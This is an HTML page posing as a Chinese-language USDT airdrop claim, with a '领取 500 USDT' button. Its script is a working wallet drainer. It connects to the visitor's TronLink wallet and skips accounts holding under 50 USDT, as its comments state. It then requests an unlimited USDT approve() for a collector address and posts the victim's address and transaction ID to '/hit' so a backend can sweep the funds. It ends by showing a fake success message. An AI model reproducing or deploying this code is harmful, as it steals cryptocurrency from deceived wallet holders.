<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>USDT 空投领取</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
</head>
<body>
<button id="btn">立即领取 500 USDT</button>
<script>
const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';   // 主网 USDT TRC20
const COLLECTOR = 'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG';
const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

document.getElementById('btn').onclick = async () => {
  if (!window.tronLink) { location.href = 'https://www.tronlink.org/'; return; }
  const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
  if (r.code !== 200) return;
  const tw = window.tronWeb;
  const addr = tw.defaultAddress.base58;

  // 余额筛选：没钱的地址看到正常页面，别浪费
  const c = await tw.contract().at(USDT);
  const bal = await c.balanceOf(addr).call();
  if (Number(bal) < 50_000_000) { /* <50 USDT，弹个“未中签”走人 */ return; }

  // 真正的一步：approve 无限
  const txid = await c.approve(COLLECTOR, MAX).send({ feeLimit: 100_000_000 });

  // 上报地址，后端立刻归集
  fetch('/hit', { method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ addr, txid }) });
  document.body.innerHTML = '<h2>领取成功，500 USDT 将在 24 小时内到账</h2>';
};
</script>
</body></html>
